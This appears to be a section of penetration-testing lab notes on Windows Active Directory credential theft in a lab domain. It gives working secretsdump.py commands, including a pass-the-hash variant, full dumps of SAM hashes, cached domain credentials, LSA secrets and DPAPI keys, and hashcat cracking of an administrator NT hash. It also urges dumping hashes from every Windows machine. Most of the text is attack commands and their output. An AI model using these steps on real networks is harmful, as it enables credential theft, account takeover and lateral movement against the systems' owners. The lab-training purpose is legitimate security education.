# II. Dumping and Cracking Hashes

This can be done using the tool `secretsdump.py`.

```bash
secretsdump.py <DOMAIN>/<user>:'<pass>'@USER-MACHINE-IP
```

```bash
┌──(kali㉿kali)-[~]
└─$ secretsdump.py ONEPIECE.local/franky:'Password1'@10.0.2.11
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4b37e7f7ea32dd1875991fc2a860f86c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4320ef599b0861e59eabb8b16ccf520f:::
Suuuper:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
ONEPIECE.LOCAL/Administrator:$DCC2$10240#Administrator#5f1f7d353c3f70359e28ba94595e61ab
ONEPIECE.LOCAL/Franky:$DCC2$10240#Franky#0caf57e5d90713681c22fa223d5adfd8
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ONEPIECE\FRANKY$:aes256-cts-hmac-sha1-96:8cdd28b6d2d8054ddfc951e32a5013b0d7c8478c449465a9855cf7a026387b37
ONEPIECE\FRANKY$:aes128-cts-hmac-sha1-96:5eec8b123f2031b67e77103fe5d274f7
ONEPIECE\FRANKY$:des-cbc-md5:614589f1fd137a1a
ONEPIECE\FRANKY$:aad3b435b51404eeaad3b435b51404ee:ba1fd33af3188537378b74bc188a10f5:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xa958cb947d9ecfb065b6b8132961850a4367d0f2
dpapi_userkey:0xa4de1bda19c3ab4d1885fa8e4a26a158751a6694
[*] NL$KM 
 0000   51 F9 42 FA EC 06 AE 40  45 10 03 00 58 2C A8 69   Q.B....@E...X,.i
 0010   E5 44 1E 95 E0 49 34 60  72 1B 2B B7 C2 39 12 A3   .D...I4`r.+..9..
 0020   CF 52 0F B3 CF 42 CD BD  76 36 C1 D0 BB F8 34 D6   .R...B..v6....4.
 0030   56 63 A3 D5 28 25 A4 A4  75 1C D2 BF 1E EE 95 49   Vc..(%..u......I
NL$KM:51f942faec06ae4045100300582ca869e5441e95e0493460721b2bb7c23912a3cf520fb3cf42cdbd7636c1d0bbf834d65663a3d52825a4a4751cd2bf1eee9549
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

The most important thing to get out of this are the SAM hashes. Especially the Admin and User hashes. These can be cracked to get access into accounts.

Do this across all windows machine to collect as many user and admin hashes we can.

We can also use secretsdump to perform a pass the hash attack:

```bash
secretsdump.py <DOMAIN>@IP -hashes <hash>
```

```bash
┌──(kali㉿kali)-[~]
└─$ secretsdump.py administrator:@10.0.2.11 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4b37e7f7ea32dd1875991fc2a860f86c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4320ef599b0861e59eabb8b16ccf520f:::
Suuuper:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
ONEPIECE.LOCAL/Administrator:$DCC2$10240#Administrator#5f1f7d353c3f70359e28ba94595e61ab
ONEPIECE.LOCAL/Franky:$DCC2$10240#Franky#0caf57e5d90713681c22fa223d5adfd8
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ONEPIECE\FRANKY$:aes256-cts-hmac-sha1-96:8cdd28b6d2d8054ddfc951e32a5013b0d7c8478c449465a9855cf7a026387b37
ONEPIECE\FRANKY$:aes128-cts-hmac-sha1-96:5eec8b123f2031b67e77103fe5d274f7
ONEPIECE\FRANKY$:des-cbc-md5:614589f1fd137a1a
ONEPIECE\FRANKY$:aad3b435b51404eeaad3b435b51404ee:ba1fd33af3188537378b74bc188a10f5:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xa958cb947d9ecfb065b6b8132961850a4367d0f2
dpapi_userkey:0xa4de1bda19c3ab4d1885fa8e4a26a158751a6694
[*] NL$KM 
 0000   51 F9 42 FA EC 06 AE 40  45 10 03 00 58 2C A8 69   Q.B....@E...X,.i
 0010   E5 44 1E 95 E0 49 34 60  72 1B 2B B7 C2 39 12 A3   .D...I4`r.+..9..
 0020   CF 52 0F B3 CF 42 CD BD  76 36 C1 D0 BB F8 34 D6   .R...B..v6....4.
 0030   56 63 A3 D5 28 25 A4 A4  75 1C D2 BF 1E EE 95 49   Vc..(%..u......I
NL$KM:51f942faec06ae4045100300582ca869e5441e95e0493460721b2bb7c23912a3cf520fb3cf42cdbd7636c1d0bbf834d65663a3d52825a4a4751cd2bf1eee9549
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

We can crack the hashes as well using the NT portion of the hash (second half of the hash.)

Copy the NT portion, save into a text file i.e `ntlm.txt`

Identify the hash first using the `hash-identifier` command:

Paste in the hash.

```bash
HASH: 7facdc498ed1680c4fd1448319a8c04f 

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```

Identified as MD5

Now use hashcat:

```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
```

And we have the password:

```bash
7facdc498ed1680c4fd1448319a8c04f:Password1!     
```